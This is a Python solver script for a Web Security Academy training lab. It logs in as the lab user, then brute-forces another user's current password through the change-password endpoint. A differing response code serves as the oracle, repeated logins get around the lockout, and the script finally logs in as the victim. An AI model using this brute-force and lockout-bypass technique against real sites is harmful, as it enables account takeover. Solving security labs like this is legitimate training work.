from web_security_academy.core.utils import *
from time import sleep


def solve_lab(session):
    passwords = auth_lab_passwords()
    print_info(
        "Attempting to change Carlos's password (Requires his current password)..."
    )

    for password in passwords:
        session.post_path("/logout")
        session.post_path("/login", data={"username": "wiener", "password": "peter"})

        data = {
            "username": "carlos",
            "current-password": password,
            "new-password-1": password,
            "new-password-2": password,
        }
        resp = session.post_path(
            "/my-account/change-password",
            data=data,
            allow_redirects=False,
        )

        if resp.status_code == 302:
            print_info_secondary(
                f"{password} => Incorrect password",
                end="\x1b[1K",
            )
        else:
            print_success(f"{password} => Password changed successfully!\n")
            break
    else:
        print_fail("Unable to find Carlos's current password.")

    print_info("Sleeping for 1 minute to remove account lock...")
    sleep(60)
    session.login("carlos", password, with_csrf=False)
